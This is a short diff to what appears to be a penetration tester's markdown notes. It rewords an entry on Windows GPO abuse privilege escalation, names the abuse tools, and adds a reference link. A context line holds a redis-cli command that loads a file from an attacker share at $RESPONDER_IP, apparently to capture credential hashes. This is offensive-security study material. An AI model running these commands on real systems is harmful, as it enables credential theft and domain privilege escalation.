@@ -354,5 +354,6 @@ redis-cli> eval "dofile('//$RESPONDER_IP//Share')"
 
 #### GenericWrite Permissions to a domain GPO Privilege Escalation Technique
 If a Domain Admin has GenericWrite permissions to a GPO policy it is possible to add that user to the LocalAdministrators group.
-- Attack known as Windows GPO Abuse
-- Exploit with tools like: SharpGPOAbuse, PowerGPOAbuse, pyGPOAbuse
+Attack known as Windows GPO Abuse.\
+Exploit with tools like: SharpGPOAbuse, PowerGPOAbuse, pyGPOAbuse.\
+**[Link](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-group-policy-objects/#abuse-gpo-with-sharpgpoabuse)** to the resource I found while researching the privilege escalation technique.
